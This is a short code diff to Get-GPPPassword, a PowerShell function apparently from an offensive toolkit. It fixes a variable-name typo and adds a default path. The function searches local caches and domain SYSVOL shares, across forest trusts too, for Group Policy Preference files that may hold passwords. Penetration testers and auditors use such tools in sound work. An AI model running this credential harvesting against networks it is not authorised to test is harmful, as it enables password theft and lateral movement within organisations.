@@ -296,12 +296,17 @@ http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
     }
 
     try {
-        $XMlFiles = @()
+        $XMLFiles = @()
         $Domains = @()
+
+        $AllUsers = $Env:ALLUSERSPROFILE
+        if (-not $AllUsers) {
+            $AllUsers = 'C:\ProgramData'
+        }
 
         # discover any locally cached GPP .xml files
         Write-Verbose '[Get-GPPPassword] Searching local host for any cached GPP files'
-        $MlFiles += Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
+        $XMLFiles += Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
 
         if ($SearchForest) {
             Write-Verbose '[Get-GPPPassword] Searching for all reachable trusts'
@@ -325,11 +330,11 @@ http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
             $DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -ErrorAction SilentlyContinue -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')
 
             if($DomainXMLFiles) {
-                $XMlFiles += $DomainXMLFiles
+                $XMLFiles += $DomainXMLFiles
             }
         }
 
-        if ( -not $XMlFiles ) { throw '[Get-GPPPassword] No preference files found.' }
+        if ( -not $XMLFiles ) { throw '[Get-GPPPassword] No preference files found.' }
 
         Write-Verbose "[Get-GPPPassword] Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
 
